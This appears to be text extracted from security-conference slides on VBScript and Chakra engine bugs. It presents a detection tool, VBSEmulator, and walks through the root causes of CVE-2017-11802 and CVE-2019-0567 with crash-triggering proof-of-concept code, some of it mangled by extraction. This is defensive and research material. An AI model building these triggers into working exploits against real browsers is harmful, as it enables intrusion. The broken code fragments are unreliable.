CollectGarbage();               
} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
|this| pointer is still saved on the stack and not tracked by GC
Get a dangling pointer
VBSEmulator
What is VBScript
• One script language developed by Microsoft
• Not meet ECMAScript standard
• Run in vbscript.dll
• Not open sourced 
How does vbscript.dll work
• Load
• Parse
• Compile
• Run
• Unload
How does vbscript.dll work
• Load
• Parse
• Compile
• Run
• Unload
CScriptRuntime::RunNoEH(CScriptRuntime *__hidden this, struct VAR *)
How does vbscript.dll work
• Load
• Parse
• Compile
• Run
• Unload
CScriptRuntime::RunNoEH(CScriptRuntime *__hidden this, struct VAR *)
CScriptRuntime
+0x28 Local Variables
+0x2C Function Arguments
+0xB0 Statck Pointer
+0xB4 Position Counter
+0xC0 CompiledScript
CompiledScript
+0x10 func_offset
+0x14 func_count
+0x1C bos_info
+0x28 bos_data
+0x2C bos_data_length
What is VBSEmulator
• One tool can deobfuscate vbs obfuscated sample
• One tool can detect GodMode or ROP
How does VBSEmulator work
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
How does VBSEmulator work
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Functions hooked are not exported
•
Need to maintain one hooked functions entry point pattern
•
By hooking LoadLibrary, I can use specialized vbscript.dll
How does VBSEmulator work
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Exploit1: GodMode
How does VBSEmulator work
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Exploit2: ROP
How does VBSEmulator work
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Detect Exploit1: GodMode
(1) Hook COleScript::CanObjectRun
(2) Check if safe mode flag modified
(3) If detect, throw exception and stop running ActiveX 
•
Detect Exploit2: ROP
(1) Hook ntdll!NtContinue
(2) Check if CONTEXT.Eip ==VirtualProtect
(3) If detect, throw exception and stop running shellcode
Demo
Chakra
What is Chakra
• A JavaScript engine developed by Microsoft
• Used in Microsoft Edge
• Forked from Jscript9 Used in Internet Explorer
• Open sourced as ChakraCore in GitHub ☺
How does Chakra work
• Parser
• Interpreter
• JIT compiler
• Garbage Collector
From: https://github.com/Microsoft/ChakraCore/wiki/Architecture-Overview
Basic variable type in Chakra
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Basic variable type in Chakra
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
segment
Basic variable type in Chakra
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Basic variable type in Chakra
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Basic variable type in Chakra
• Array
•
Type Conversion in Array
arr[0] = {}; 
JavascriptNativeFloatArray
JavascriptArray
Basic variable type in Chakra
• Object
•
Memory layout of DynamicObject
var obj2 = {__proto__:obj1};
Chakra JIT Type Confusion 
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=chakra
Chakra JIT Type Confusion 
• Example
function opt(obj) {
foo(obj);
}
for(let i=0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Root Cause
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Define one JavascriptFloatArray
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
for loop force opt() to be JITed and optimized
• Case Study: CVE-2017-11802 : Root Cause
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
|replace| will trigger ImplicitCall callback
• Case Study: CVE-2017-11802 : Root Cause
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Root Cause
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Call opt() JITed code directly
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
|replace| will trigger ImplicitCall callback
| arr[0]={}| will change the Array type from
JavascriptNativeFloatArray to JavascriptArray
• Case Study: CVE-2017-11802 : Root Cause
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Root Cause
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
JITed opt() still assumes arr type is JavascriptNativeFloatArray. 
Type confusion happened!
opt JITed Code
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Root Cause
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Patch
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Patch
Chakra JIT Type Confusion 
• Case Study: CVE-2017-11802 : Patch
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; i<0x10000; i++)
opt(obj1, obj2);
opt(obj1, obj1);
//trigger exception
obj1.a.toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2019-0567
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567 : Root Cause
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; i<0x10000; i++)
opt(obj1, obj2);
opt(obj1, obj1);
//trigger exception
obj1.a.toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2019-0567
Create two objects
Chakra JIT Type Confusion 